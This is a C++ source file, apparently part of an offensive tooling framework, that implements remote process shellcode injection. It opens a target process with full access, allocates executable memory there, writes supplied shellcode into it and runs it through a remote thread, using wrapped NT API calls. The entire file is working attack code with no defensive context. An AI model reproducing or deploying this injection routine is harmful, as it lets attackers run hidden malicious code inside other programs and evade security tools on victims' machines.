#include "core/technique.hpp"

namespace Technique::Injection
{
    BOOL ShellcodeInjection(Procs::PPROCS pProcs, DWORD dwPID, const std::vector<BYTE>& shellcode)
    {
        HANDLE hProcess;
        HANDLE hThread;
        PVOID pBaseAddr;

        hProcess = System::Process::ProcessOpen(pProcs, dwPID, PROCESS_ALL_ACCESS);
        if (!hProcess)
        {
            return FALSE;
        }

        pBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            shellcode.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!pBaseAddr)
        {
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            pBaseAddr,
            (LPVOID)shellcode.data(),
            shellcode.size(),
            NULL
        )) {
            System::Process::VirtualMemoryFree(
                pProcs,
                hProcess,
                &pBaseAddr,
                0,
                MEM_RELEASE
            );
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            (LPTHREAD_START_ROUTINE)pBaseAddr,
            NULL
        );
        if (!hThread)
        {
            System::Process::VirtualMemoryFree(
                pProcs,
                hProcess,
                &pBaseAddr,
                0,
                MEM_RELEASE
            );
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);

        pProcs->lpNtClose(hProcess);
        pProcs->lpNtClose(hThread);

        return TRUE;
    }
}